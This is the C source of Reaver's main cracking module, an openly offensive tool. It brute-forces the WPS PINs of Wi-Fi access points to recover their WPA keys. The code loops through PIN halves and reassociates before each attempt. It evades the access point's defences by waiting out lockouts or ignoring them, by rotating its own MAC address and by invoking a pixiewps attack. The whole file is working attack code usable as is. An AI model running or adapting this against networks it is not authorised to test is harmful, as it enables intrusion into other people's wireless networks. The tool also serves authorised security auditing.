/*
 * Reaver - Main cracking functions
 * Copyright (c) 2011, Tactical Network Solutions, Craig Heffner <cheffner@tacnetsol.com>
 *
 *  This program is free software; you can redistribute it and/or modify
 *  it under the terms of the GNU General Public License as published by
 *  the Free Software Foundation; either version 2 of the License, or
 *  (at your option) any later version.
 *
 *  This program is distributed in the hope that it will be useful,
 *  but WITHOUT ANY WARRANTY; without even the implied warranty of
 *  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 *  GNU General Public License for more details.
 *
 *  You should have received a copy of the GNU General Public License
 *  along with this program; if not, write to the Free Software
 *  Foundation, Inc., 59 Temple Place, Suite 330, Boston, MA  02111-1307  USA
 *
 *
 *  In addition, as a special exception, the copyright holders give
 *  permission to link the code of portions of this program with the
 *  OpenSSL library under certain conditions as described in each
 *  individual source file, and distribute linked combinations
 *  including the two.
 *  You must obey the GNU General Public License in all respects
 *  for all of the code used other than OpenSSL. *  If you modify
 *  file(s) with this exception, you may extend this exception to your
 *  version of the file(s), but you are not obligated to do so. *  If you
 *  do not wish to do so, delete this exception statement from your
 *  version. *  If you delete this exception statement from all source
 *  files in the program, then also delete it here.
 */

#include "cracker.h"
#include "pixie.h"
#include "utils/vendor.h"
#include "utils/endianness.h"

void update_wpc_from_pin(void) {
	/* update WPC file with found pin */
	pixie.do_pixie = 0;
	/* reset string pin mode if -p "" was used */
	set_pin_string_mode(0);
	/* clean static pin if -p [PIN] was used */
	set_static_p2(NULL);
	parse_static_pin(get_pin());

	/* check the pin is valid WPS pin, if exist static p2 then is valid WPS pin */
	if (get_static_p2()) {
		enum key_state key_status = get_key_status();
		/* reset key status for sort p1 and p2 */
		set_key_status(KEY1_WIP);
		/* sort pin into current index of p1 and p2 array */
		if (jump_p1_queue(get_static_p1()) > 0) {
			cprintf(VERBOSE, "[+] Updated P1 array\n");
		}
		if (jump_p2_queue(get_static_p2()) > 0) {
			cprintf(VERBOSE, "[+] Updated P2 array\n");
		}
		/* restore key status after sorted p1 and p2 */
		set_key_status((key_status == KEY_DONE)?KEY_DONE:KEY2_WIP);
	}
}

static void extract_uptime(const struct beacon_management_frame *beacon)
{
	uint64_t timestamp;
	memcpy(&timestamp, beacon->timestamp, 8);
	globule->uptime = end_le64toh(timestamp);
}

static void set_next_mac() {
	unsigned char newmac[6];
	uint32_t l4b;
	memcpy(newmac, get_mac(), 6);
	memcpy(&l4b, newmac+2, 4);
	l4b = end_be32toh(l4b);
	do ++l4b;
	while ((l4b & 0xff) == 0 || (l4b & 0xff) == 0xff);
	l4b = end_htobe32(l4b);
	memcpy(newmac+2, &l4b, 4);
	set_mac(newmac);
	cprintf(WARNING, "[+] Using MAC %s\n", mac2str(get_mac(), ':'));
}

/* Brute force all possible WPS pins for a given access point */
void crack()
{
	char *bssid = NULL;
	char *pin = NULL;
	int fail_count = 0, loop_count = 0, sleep_count = 0, assoc_fail_count = 0;
	int pin_count = 0;
	time_t start_time = 0;
	enum wps_result result = 0;

	if(!get_iface())
	{
		return;
	}

	if(get_max_pin_attempts() == -1)
	{
		cprintf(CRITICAL, "[X] ERROR: This device has been blacklisted and is not supported.\n");
		return;
	}

	/* Initialize network interface */
	set_handle(capture_init(get_iface()));

	if(get_handle() == NULL) {
		cprintf(CRITICAL, "[-] Failed to initialize interface '%s'\n", get_iface());
		return;	
	}
	generate_pins();

	/* Restore any previously saved session */
	if(get_static_p1() == NULL || !get_pin_string_mode())
	{
		/* Check the specified 4/8 digit WPS PIN has been already tried */
		if (restore_session() == -1) return;
	}

	/* Convert BSSID to a string */
	bssid = mac2str(get_bssid(), ':');

	/* 
	 * We need to get some basic info from the AP, and also want to make sure the target AP
	 * actually exists, so wait for a beacon packet 
	 */
	cprintf(INFO, "[+] Waiting for beacon from %s\n", bssid);
	read_ap_beacon();
	cprintf(INFO, "[+] Received beacon from %s\n", bssid);
	char *vendor;
	if((vendor = get_vendor_string(get_vendor())))
		cprintf(INFO, "[+] Vendor: %s\n", vendor);

	/* I'm fairly certian there's a reason I put this in twice. Can't remember what it was now though... */	
	if(get_max_pin_attempts() == -1)
	{
		cprintf(CRITICAL, "[X] ERROR: This device has been blacklisted and is not supported.\n");
		return;
	}

	#if 0
	/* This initial association is just to make sure we can successfully associate */
	while(!reassociate()) {
		if(assoc_fail_count == MAX_ASSOC_FAILURES)
		{
			assoc_fail_count = 0;
			cprintf(CRITICAL, "[!] WARNING: Failed to associate with %s (ESSID: %s)\n", bssid, get_ssid());
		}
		else
		{
			assoc_fail_count++;
		}
	}
	#endif

	/* Used to calculate pin attempt rates */
	start_time = time(NULL);

	/* If the key status hasn't been explicitly set by restore_session(), ensure that it is set to KEY1_WIP */
	if(get_key_status() <= KEY1_WIP)
	{
		set_key_status(KEY1_WIP);
	}
	/* 
	 * If we're starting a session at KEY_DONE, that means we've already cracked the pin and the AP is being re-attacked.
	 * Re-set the status to KEY2_WIP so that we properly enter the main cracking loop.
	 */
	else if(get_key_status() == KEY_DONE)
	{
		set_key_status(KEY2_WIP);
	}

	/* Main cracking loop */
	for(loop_count=0, sleep_count=0; get_key_status() != KEY_DONE; loop_count++, sleep_count++)
	{
		/* MAC Changer */
		if (get_mac_changer()) {
			set_next_mac();
		}

		/* 
		 * Some APs may do brute force detection, or might not be able to handle an onslaught of WPS
		 * registrar requests. Using a delay here can help prevent the AP from locking us out.
		 */
		pcap_sleep(get_delay());

		/* Users may specify a delay after x number of attempts */
		if((get_recurring_delay() > 0) && (sleep_count == get_recurring_delay_count()))
		{
			cprintf(VERBOSE, "[+] Entering recurring delay of %d seconds\n", get_recurring_delay());
			pcap_sleep(get_recurring_delay());
			sleep_count = 0;
		}

		/* 
		 * Some APs identify brute force attempts and lock themselves for a short period of time (typically 5 minutes).
		 * Verify that the AP is not locked before attempting the next pin.
		 */
		int locked_status = 0;
		while(1) {
			struct pcap_pkthdr header;
			const unsigned char *packet;
			const struct dot11_frame_header *frame_header;
			const struct beacon_management_frame *beacon;
			while((packet = next_beacon(&header, &frame_header, &beacon))) {
				if(is_target(frame_header)) break;
			}
			if(!packet) break;
			/* since we have to wait for a beacon anyway, we also
			   use it to update the router's timeout */
			locked_status = is_wps_locked(&header, packet);
			extract_uptime(beacon);
			if(locked_status == 1 && get_ignore_locks() == 0) {
				cprintf(WARNING, "[!] WARNING: Detected AP rate limiting, waiting %d seconds before re-checking\n", get_lock_delay());
				pcap_sleep(get_lock_delay());
				continue;
			}
			break;
		}
		if(locked_status == -1) {
			cprintf(WARNING, "[!] AP seems to have WPS turned off\n");
		}

		/* Initialize wps structure */
		set_wps(initialize_wps_data());
		if(!get_wps())
		{
			cprintf(CRITICAL, "[-] Failed to initialize critical data structure\n");
			break;
		}

		/* Try the next pin in the list */
		pin = build_next_pin();
		if(!pin)
		{
			cprintf(CRITICAL, "[-] Failed to generate the next payload\n");
			break;
		}
		else
		{
			cprintf(WARNING, "[+] Trying pin \"%s\"\n", pin);
		}

		/* 
		 * Reassociate with the AP before each WPS exchange. This is necessary as some APs will
		 * severely limit our pin attempt rate if we do not.
		 */
		assoc_fail_count = 0;
		while(!reassociate()) {
			if(assoc_fail_count == MAX_ASSOC_FAILURES)
			{
				assoc_fail_count = 0;
				cprintf(CRITICAL, "[!] WARNING: Failed to associate with %s (ESSID: %s)\n", bssid, get_ssid());
			}
			else
			{
				assoc_fail_count++;
			}
		}
		cprintf(INFO, "[+] Associated with %s (ESSID: %s)\n", bssid, get_ssid());


		/* 
		 * Enter receive loop. This will block until a receive timeout occurs or a
		 * WPS transaction has completed or failed.
		 */
		result = do_wps_exchange();

		switch(result)
		{
			/* 
			 * If the last pin attempt was rejected, increment 
			 * the pin counter, clear the fail counter and move 
			 * on to the next pin.
			 */
			case KEY_REJECTED:
				fail_count = 0;
				pin_count++;
				advance_pin_count();
				break;
			/* Got it!! */
			case KEY_ACCEPTED:
				break;
			/* Unexpected timeout or EAP failure...try this pin again */
			default:
				cprintf(VERBOSE, "[!] WPS transaction failed (code: 0x%.2X), re-trying last pin\n", result);
				fail_count++;
				break;
		}

		/* If we've had an excessive number of message failures in a row, print a warning */
		if(fail_count == WARN_FAILURE_COUNT)
		{
			cprintf(WARNING, "[!] WARNING: %d failed connections in a row\n", fail_count);
			fail_count = 0;
			pcap_sleep(get_fail_delay());
		}

		/* Display status and save current session state every DISPLAY_PIN_COUNT loops */
		if(loop_count == DISPLAY_PIN_COUNT)
		{
			save_session();
			display_status(pin_count, start_time);
			loop_count = 0;
		}

		/* 
		 * The WPA key and other settings are stored in the globule->wps structure. If we've 
		 * recovered the WPS pin and parsed these settings, don't free this structure. It 
		 * will be freed by wpscrack_free() at the end of main().
		 */
		if(get_key_status() != KEY_DONE)
		{
			wps_deinit(get_wps());
			set_wps(NULL);
		}
		/* If we have cracked the pin, save a copy */
		else
		{
			/* pixie already sets the pin if successful */
			if(!pixie.do_pixie) set_pin(pin);
		}

		free(pin);
		pin = NULL;

		if(pixie.do_pixie && get_pin()) {
			/* if we get here it means pixiewps process was successful,
			   but getting the pin may or may not have worked. */
			update_wpc_from_pin();
			cprintf(VERBOSE, "[+] Quitting after pixiewps attack\n");
			break;
		}

		/* If we've hit our max number of pin attempts, quit */
		if (pin_count >= get_max_pin_attempts())
		{
			cprintf(VERBOSE, "[+] Quitting after %d crack attempts\n", pin_count);
			break;
		}
	}

	if(bssid) free(bssid);
	if(get_handle())
	{
		pcap_close(get_handle());
		set_handle(NULL);
	}
}

/* 
 * Increment the index into the p1 or p2 array as appropriate.
 * If we're still trying to brute force the first half, increment p1.
 * If we're working on the second half, increment p2.
 */
void advance_pin_count()
{
	if(get_key_status() == KEY1_WIP)
	{
		set_p1_index(get_p1_index() + 1);
	} 
	else if(get_key_status() == KEY2_WIP)
	{
		set_p2_index(get_p2_index() + 1);
	}
}

/* Displays the status and rate of cracking */
void display_status(int pin_count, time_t start_time)
{
	float percentage = 0;
	int attempts = 0, average = 0;
	time_t now = 0, diff = 0;
	struct tm *tm_p = NULL;
        char time_s[256] = { 0 };

	if(get_key_status() == KEY1_WIP)
	{
		attempts = get_p1_index() + get_p2_index();
	}
	/* 
	 * If we've found the first half of the key, then the entire key1 keyspace
	 * has been exhausted/eliminated. Our output should reflect that.
	 */
	else if(get_key_status() == KEY2_WIP)
	{
		attempts = P1_SIZE + get_p2_index();
	}
	else if(get_key_status() == KEY_DONE)
	{
		attempts = P1_SIZE + P2_SIZE;
	}

	percentage = (float) (((float) attempts / (P1_SIZE + P2_SIZE)) * 100);
	
	now = time(NULL);
	diff = now - start_time;

        tm_p = localtime(&now);
	if(tm_p)
	{
        	strftime(time_s, sizeof(time_s), TIME_FORMAT, tm_p);
	}
	else
	{
		perror("localtime");
	}

	if(pin_count > 0)
	{
		average =  (int) (diff / pin_count);
	}
	else
	{
		average = 0;
	}

	cprintf(INFO, "[+] %.2f%% complete @ %s (%d seconds/pin)\n", percentage, time_s, average);

	return;
}
